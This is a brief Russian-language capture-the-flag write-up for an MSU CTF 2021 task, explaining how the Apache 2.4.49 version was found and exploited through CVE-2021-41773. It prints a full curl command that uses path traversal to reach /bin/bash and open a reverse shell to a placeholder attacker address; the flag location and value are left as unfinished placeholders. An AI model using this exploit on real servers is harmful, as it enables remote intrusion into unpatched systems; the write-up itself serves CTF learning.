# Middle-aged daemon

_http://middle-aged-daemon.tasks.2021.ctf.cs.msu.ru:8080_

### Solution

Делаем GET запрос на ссылку из условия и в ответе ищем заголовок Server, по подсказке из названия таска. _Server: Apache/2.4.49_.

Ищем в интернете уязвимости веб-сервера Apache версии 2.4.49 и находим CVE-2021-41773:
_https://www.exploit-db.com/exploits/50383_
 
С помощью утилиты curl используем данную уязвимость, чтобы прокинуть ревёрс-шелл.

```bash
curl "http://middle-aged-daemon.tasks.2021.ctf.cs.msu.ru:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash" -d 'echo;bash -i >& /dev/tcp/atacker_ip/port 0>&1'
```

Находим флаг в директории *дописать* и читаем его с помощью утилиты cat.

`
Flag: MSKCTF{TO_BE_REDACTED}
`
